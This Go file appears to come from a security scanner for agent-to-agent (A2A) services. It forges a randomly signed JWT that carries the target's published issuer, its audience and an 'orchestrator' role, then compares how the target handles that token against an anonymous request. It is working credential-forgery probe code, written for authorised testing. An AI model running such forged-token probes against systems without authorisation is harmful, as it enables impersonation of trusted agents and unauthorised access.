package a2a

import (
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/calbebop/batesian/internal/attack"
	protoa2a "github.com/calbebop/batesian/internal/protocol/a2a"
)

// PeerImpersonationExecutor compares a forged bearer JWT with an anonymous
// request. A refusal is only meaningful when the issuer is known and the
// response identifies an authentication failure.
type PeerImpersonationExecutor struct {
	rule attack.RuleContext
}

func init() {
	attack.Register("a2a-peer-impersonation", func(rc attack.RuleContext) attack.Executor { return NewPeerImpersonationExecutor(rc) })
}

// NewPeerImpersonationExecutor creates an executor for the peer impersonation rule.
func NewPeerImpersonationExecutor(r attack.RuleContext) *PeerImpersonationExecutor {
	return &PeerImpersonationExecutor{rule: r}
}

func (e *PeerImpersonationExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	ctx = withTenantRouting(ctx)
	vars := attack.NewVars(target, opts.OOBListenerURL)
	// Two clients: one with any configured token for card fetching, and one
	// explicitly without for the unauthenticated baseline probe (step 4).
	client := attack.NewHTTPClient(opts, vars)
	unauthClient := attack.NewUnauthHTTPClient(opts, vars)

	endpoint, ok := resolveA2AEndpoint(ctx, unauthClient, vars.BaseURL)
	if !ok {
		return nil, attack.ErrInconclusive
	}

	// Step 1: Probe the agent card for a plausible agent name to impersonate, and
	// keep the parsed card: its security schemes are where the trusted issuer is
	// published, and its service URL is the audience the server expects.
	agentName := "trusted-orchestrator"
	var card *protoa2a.AgentCard
	body, cardOK, cardReadReason := fetchAgentCardBodyWithOutcome(ctx, client, vars.BaseURL)
	if cardOK {
		var parsed protoa2a.AgentCard
		if err := json.Unmarshal(body, &parsed); err == nil {
			card = &parsed
			if parsed.Name != "" {
				agentName = parsed.Name
			}
		} else {
			if cardReadReason != "" {
				cardReadReason += "; "
			}
			cardReadReason += "Agent Card fields could not be parsed"
		}
	}

	// Step 2: Build the forged JWT using a random signing key, carrying the issuer
	// and audience the target actually trusts.
	claims := deriveForgedClaims(ctx, client, vars.BaseURL, endpoint, target, card)
	forgedToken, err := buildForgedJWT(agentName, claims.iss, claims.aud)
	if err != nil {
		return nil, fmt.Errorf("building forged JWT: %w", err)
	}

	// Compare both supported send methods; one version may enforce a different gate.
	pairs, incomplete := e.probeWires(ctx, client, unauthClient, endpoint, forgedToken, vars.RandID)
	if cardReadReason != "" {
		incomplete = append(incomplete, "Agent Card prerequisite: "+cardReadReason)
	}
	if len(pairs) == 0 {
		if len(incomplete) > 0 {
			return nil, fmt.Errorf("%w: peer assessment incomplete: %s", attack.ErrInconclusive,
				strings.Join(incomplete, "; "))
		}
		return nil, fmt.Errorf("%w: no revision's send method is implemented at %s "+
			"(tried v1.0 SendMessage and v0.3 message/send), so credential handling was never exercised",
			attack.ErrInconclusive, endpoint)
	}

	var findings []attack.Finding
	for _, pair := range pairs {
		forgedResp, baselineResp := pair.forged, pair.baseline
		wire, forgedOK, baselineOK := pair.wire, pair.forgedOK, pair.baselineOK
		forgedDenied := peerAuthDenied(forgedResp)
		baselineDenied := peerAuthDenied(baselineResp)

		if forgedOK && !baselineOK && !baselineDenied {
			incomplete = append(incomplete, wire+" anonymous baseline did not establish an authentication rejection")
		}
		if !forgedOK && !forgedDenied {
			incomplete = append(incomplete, wire+" forged token response did not establish an authentication rejection")
		}
		if !forgedOK && baselineOK {
			incomplete = append(incomplete, wire+" anonymous request succeeded while the forged token was refused")
		}
		if !forgedOK && !claims.issuerReliable {
			incomplete = append(incomplete, wire+" "+claims.issuerUncertainty)
		}

		switch {
		case forgedOK && baselineDenied:
			findings = append(findings, attack.Finding{
				RuleID:     e.rule.ID,
				RuleName:   e.rule.Name,
				Severity:   "high",
				Confidence: attack.ConfirmedExploit,
				Title:      fmt.Sprintf("A2A %s accepted a randomly signed JWT but rejected anonymous access", wire),
				Description: fmt.Sprintf(
					"A randomly signed HS256 JWT was accepted (HTTP %d), while "+
						"the same request without a token was rejected (HTTP %d). This demonstrates "+
						"that this token passed the endpoint's authentication gate. It does not establish "+
						"which claim was honored or that peer-specific privileges were granted.",
					forgedResp.StatusCode, baselineResp.StatusCode),
				Evidence: fmt.Sprintf(
					"token: randomly signed HS256 JWT (value omitted)\nissuer source: %s\nissuer and audience values omitted\n"+
						"wire: %s\nForged response: HTTP %d\nBaseline response: HTTP %d\nreply content omitted",
					claims.source, wire,
					forgedResp.StatusCode, baselineResp.StatusCode),
				Remediation: e.rule.Remediation,
				TargetURL:   endpoint,
			})

		case forgedOK && baselineOK:
			findings = append(findings, attack.Finding{
				RuleID:     e.rule.ID,
				RuleName:   e.rule.Name,
				Severity:   "medium",
				Confidence: attack.RiskIndicator,
				Title:      fmt.Sprintf("A2A %s accepted an anonymous request", wire),
				Description: fmt.Sprintf(
					"Both a randomly signed JWT request (HTTP %d) and an anonymous request "+
						"(HTTP %d) were accepted. This endpoint permits anonymous send "+
						"requests; whether that violates policy depends on the deployment. No "+
						"peer identity or elevated privilege was verified.",
					forgedResp.StatusCode, baselineResp.StatusCode),
				Evidence: fmt.Sprintf(
					"wire: %s\nForged response: HTTP %d\nBaseline response: HTTP %d\nreply content omitted",
					wire, forgedResp.StatusCode, baselineResp.StatusCode),
				Remediation: e.rule.Remediation,
				TargetURL:   endpoint,
			})
		}
	}

	if len(findings) > 1 {
		best := 0
		for i := range findings {
			if findings[i].Severity == "high" {
				best = i
				break
			}
		}
		findings = []attack.Finding{findings[best]}
	}

	if cardReadReason != "" {
		for i := range findings {
			findings[i].Evidence += "\nunobserved Agent Card prerequisite: " + cardReadReason
		}
	}
	if len(incomplete) > 0 {
		return findings, fmt.Errorf("%w: peer assessment incomplete: %s", attack.ErrInconclusive,
			strings.Join(incomplete, "; "))
	}
	return findings, nil
}

func peerAuthDenied(resp *attack.Response) bool {
	if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
		return true
	}
	if !resp.IsSuccess() {
		return false
	}
	_, hasError := jsonRPCErrorCode(resp.Body)
	return hasError && errMessageIsAuth(resp.Body)
}

// impersonationWire is one revision's send request, in the shape that revision
// defines.
type impersonationWire struct {
	name    string
	headers map[string]string
	method  string
	role    interface{}
	part    map[string]string
}

// impersonationWires lists the v1.0 and v0.3 send methods, newest first.
func impersonationWires() []impersonationWire {
	return []impersonationWire{
		{
			name:    "v1.0 SendMessage",
			headers: map[string]string{"A2A-Version": "1.0"},
			method:  "SendMessage",
			role:    "ROLE_USER",
			part:    map[string]string{"text": "ping"},
		},
		{
			name:   "v0.3 message/send",
			method: "message/send",
			role:   "user",
			part:   map[string]string{"kind": "text", "text": "ping"},
		},
	}
}

func (w impersonationWire) request(requestID, messageID string) map[string]interface{} {
	params := map[string]interface{}{
		"message": map[string]interface{}{
			"messageId": messageID,
			"role":      w.role,
			"parts":     []interface{}{w.part},
		},
	}
	if w.method == "SendMessage" {
		params["configuration"] = map[string]interface{}{"returnImmediately": true}
	}
	return jsonRPCCall(requestID, w.method, params)
}

type peerProbePair struct {
	forged, baseline     *attack.Response
	wire                 string
	forgedOK, baselineOK bool
}

// probeWires skips unsupported methods and records unobserved comparisons.
func (e *PeerImpersonationExecutor) probeWires(ctx context.Context, client, unauthClient *attack.HTTPClient,
	endpoint, forgedToken, randID string) ([]peerProbePair, []string) {
	var pairs []peerProbePair
	var incomplete []string
	for i, w := range impersonationWires() {
		requestID := fmt.Sprintf("batesian-peer-%s-%d", randID, i)
		forgedHeaders := map[string]string{"Authorization": "Bearer " + forgedToken}
		for k, v := range w.headers {
			forgedHeaders[k] = v
		}
		forgedID := requestID + "-forged"
		fResp, err := client.POST(ctx, endpoint, forgedHeaders,
			w.request(forgedID, forgedID+"-message"))
		if err != nil {
			incomplete = append(incomplete, w.name+" forged request failed")
			continue
		}
		baselineID := requestID + "-anonymous"
		bResp, err := unauthClient.POST(ctx, endpoint, w.headers,
			w.request(baselineID, baselineID+"-message"))
		if err != nil {
			incomplete = append(incomplete, w.name+" anonymous request failed")
			continue
		}
		if !peerReplyCorrelated(fResp, forgedID) || !peerReplyCorrelated(bResp, baselineID) {
			incomplete = append(incomplete, w.name+" reply did not match its request ID")
			continue
		}
		if methodAbsent(fResp) && methodAbsent(bResp) {
			continue
		}
		if methodAbsent(fResp) || methodAbsent(bResp) {
			incomplete = append(incomplete, w.name+" method availability differed between probes")
			continue
		}
		version := "0.3.0"
		if w.method == "SendMessage" {
			version = "1.0"
		}
		forgedProcessed := sendResultProcessed(fResp, forgedID, forgedID+"-message", version)
		baselineProcessed := sendResultProcessed(bResp, baselineID, baselineID+"-message", version)
		if !forgedProcessed && !peerAuthDenied(fResp) {
			incomplete = append(incomplete, w.name+" forged response did not establish a send result or authentication rejection")
			continue
		}
		if !baselineProcessed && !peerAuthDenied(bResp) {
			incomplete = append(incomplete, w.name+" anonymous response did not establish a send result or authentication rejection")
			continue
		}
		pairs = append(pairs, peerProbePair{fResp, bResp, w.name, forgedProcessed, baselineProcessed})
	}
	return pairs, incomplete
}

func peerReplyCorrelated(resp *attack.Response, requestID string) bool {
	if resp == nil {
		return false
	}
	if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
		return true
	}
	if !resp.IsSuccess() && !json.Valid(resp.Body) {
		return true
	}
	_, _, _, valid := discoveryResponse(resp.Body, requestID)
	return valid
}

// methodAbsent accepts method-not-found only with an observed RPC response.
func methodAbsent(resp *attack.Response) bool {
	if resp == nil {
		return false
	}
	if !resp.IsSuccess() && resp.StatusCode != http.StatusBadRequest && resp.StatusCode != http.StatusNotFound {
		return false
	}
	code, ok := jsonRPCErrorCode(resp.Body)
	return ok && code == methodNotFound
}

// fallbackForgedIssuer is used when no usable issuer candidate is published.
const fallbackForgedIssuer = "https://legitimate-orchestrator.example.com"

// forgedClaims tracks whether a refusal can be judged against the chosen issuer.
type forgedClaims struct {
	iss               string
	aud               string
	source            string
	issuerReliable    bool
	issuerUncertainty string
}

// deriveForgedClaims chooses a published issuer or a tentative endpoint-origin guess.
func deriveForgedClaims(ctx context.Context, client *attack.HTTPClient, baseURL, endpointURL, target string, card *protoa2a.AgentCard) forgedClaims {
	out := forgedClaims{
		iss: fallbackForgedIssuer, aud: target, source: "fabricated (target published no issuer)",
		issuerUncertainty: "no trusted issuer was published for the forged token",
	}

	if card != nil {
		if u := card.GetServiceURL(); u != "" {
			out.aud = u
		}
	}

	// Prefer metadata for the selected route before the origin-wide fallback.
	for _, metadataURL := range peerMetadataURLs(baseURL, endpointURL) {
		resp, err := client.GET(ctx, metadataURL, nil)
		if err != nil || !resp.IsSuccess() {
			continue
		}
		var meta struct {
			Resource             string   `json:"resource"`
			AuthorizationServers []string `json:"authorization_servers"`
		}
		if json.Unmarshal(resp.Body, &meta) == nil {
			selected := ""
			for _, issuer := range meta.AuthorizationServers {
				if issuer != "" {
					selected = issuer
					break
				}
			}
			if selected != "" {
				out.iss = selected
				out.source = "protected-resource metadata (authorization_servers)"
				out.issuerReliable = len(meta.AuthorizationServers) == 1 && validIssuerIdentifier(out.iss)
				switch {
				case len(meta.AuthorizationServers) > 1:
					out.issuerUncertainty = "multiple authorization-server issuers were published; only one was tested"
				case !validIssuerIdentifier(out.iss):
					out.issuerUncertainty = "protected-resource metadata did not provide a valid issuer identifier"
				}
			}
			if meta.Resource != "" {
				out.aud = meta.Resource
			}
			if selected != "" {
				return out
			}
		}
	}

	// Source 2: the agent card's security schemes.
	if card == nil {
		return out
	}
	// Use a stable scheme order so the same issuer is probed on every run.
	names := make([]string, 0, len(card.SecuritySchemes))
	for name := range card.SecuritySchemes {
		names = append(names, name)
	}
	sort.Strings(names)
	var selected string
	selectedReliable := false
	candidates := map[string]bool{}
	for _, name := range names {
		iss, reliable := issuerFromScheme(card.SecuritySchemes[name])
		if iss == "" {
			continue
		}
		candidates[iss] = true
		if selected == "" || (!selectedReliable && reliable) {
			selected, selectedReliable = iss, reliable
		}
	}
	if selected != "" {
		out.iss = selected
		out.source = "agent card security scheme"
		out.issuerReliable = selectedReliable && len(candidates) == 1
		switch {
		case len(candidates) > 1:
			out.issuerUncertainty = "multiple candidate issuers were published; only one was tested"
		case !selectedReliable:
			out.source = "agent card security scheme (issuer inferred)"
			out.issuerUncertainty = "the selected security scheme URL is not an issuer identifier"
		}
	}
	return out
}

func peerMetadataURLs(baseURL, endpointURL string) []string {
	base, err := url.Parse(baseURL)
	if err != nil || base.Scheme == "" || base.Host == "" {
		return nil
	}
	origin := base.Scheme + "://" + base.Host
	const path = "/.well-known/oauth-protected-resource"
	urls := make([]string, 0, 3)
	seen := map[string]bool{}
	for _, raw := range []string{endpointURL, baseURL} {
		u, err := url.Parse(raw)
		if err != nil || u.Scheme != base.Scheme || !strings.EqualFold(u.Host, base.Host) {
			continue
		}
		resourcePath := strings.TrimSuffix(u.EscapedPath(), "/")
		if resourcePath == "" {
			continue
		}
		metadataURL := origin + path + resourcePath
		if !seen[metadataURL] {
			seen[metadataURL] = true
			urls = append(urls, metadataURL)
		}
	}
	return append(urls, origin+path)
}

// issuerFromScheme marks flow endpoint origins as guesses, not issuer identifiers.
func issuerFromScheme(s protoa2a.SecurityScheme) (string, bool) {
	if s.OpenIDConnect != nil && s.OpenIDConnect.OpenIDConnectURL != "" {
		u := s.OpenIDConnect.OpenIDConnectURL
		if !validIssuerIdentifier(u) {
			return "", false
		}
		const suffix = "/.well-known/openid-configuration"
		if strings.HasSuffix(u, suffix) {
			return strings.TrimSuffix(u, suffix), true
		}
		return u, false
	}
	if s.OAuth2 != nil {
		for _, endpoint := range oauthFlowEndpoints(s.OAuth2.Flows) {
			if origin := urlOrigin(endpoint); origin != "" {
				return origin, false
			}
		}
	}
	return "", false
}

func validIssuerIdentifier(raw string) bool {
	u, err := url.Parse(raw)
	return err == nil && (u.Scheme == "https" || u.Scheme == "http") &&
		u.Host != "" && u.User == nil && u.RawQuery == "" && u.Fragment == ""
}

// oauthFlowEndpoints lists the authorization and token endpoints declared across
// an OAuth2 scheme's flows, in a stable order so the derived issuer does not
// depend on which flows a card happens to declare first.
func oauthFlowEndpoints(f protoa2a.OAuthFlows) []string {
	var out []string
	if f.AuthorizationCode != nil {
		out = append(out, f.AuthorizationCode.AuthorizationURL, f.AuthorizationCode.TokenURL)
	}
	if f.ClientCredentials != nil {
		out = append(out, f.ClientCredentials.TokenURL)
	}
	if f.DeviceCode != nil {
		out = append(out, f.DeviceCode.DeviceAuthorizationURL, f.DeviceCode.TokenURL)
	}
	if f.Implicit != nil {
		out = append(out, f.Implicit.AuthorizationURL)
	}
	if f.Password != nil {
		out = append(out, f.Password.TokenURL)
	}
	return out
}

// urlOrigin returns a flow endpoint's origin as a tentative issuer candidate.
func urlOrigin(raw string) string {
	if raw == "" {
		return ""
	}
	u, err := url.Parse(raw)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return ""
	}
	return u.Scheme + "://" + u.Host
}

// buildForgedJWT constructs a HS256 JWT signed with a random key.
// It uses only stdlib: encoding/base64, encoding/json, crypto/hmac, crypto/sha256, crypto/rand.
func buildForgedJWT(sub, iss, aud string) (string, error) {
	headerJSON, err := json.Marshal(map[string]string{
		"alg": "HS256",
		"typ": "JWT",
	})
	if err != nil {
		return "", err
	}

	now := time.Now().Unix()
	payloadJSON, err := json.Marshal(map[string]interface{}{
		"sub":  sub,
		"iss":  iss,
		"aud":  aud,
		"role": "orchestrator",
		"iat":  now,
		"exp":  now + 3600,
	})
	if err != nil {
		return "", err
	}

	headerEnc := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadEnc := base64.RawURLEncoding.EncodeToString(payloadJSON)
	signingInput := headerEnc + "." + payloadEnc

	// Use a fresh random key -- the server cannot know it, so a valid server
	// must reject the token. A server that accepts it trusts unsigned claims.
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return "", fmt.Errorf("generating random JWT key: %w", err)
	}

	mac := hmac.New(sha256.New, key)
	_, _ = mac.Write([]byte(signingInput))
	sig := mac.Sum(nil)

	return signingInput + "." + base64.RawURLEncoding.EncodeToString(sig), nil
}
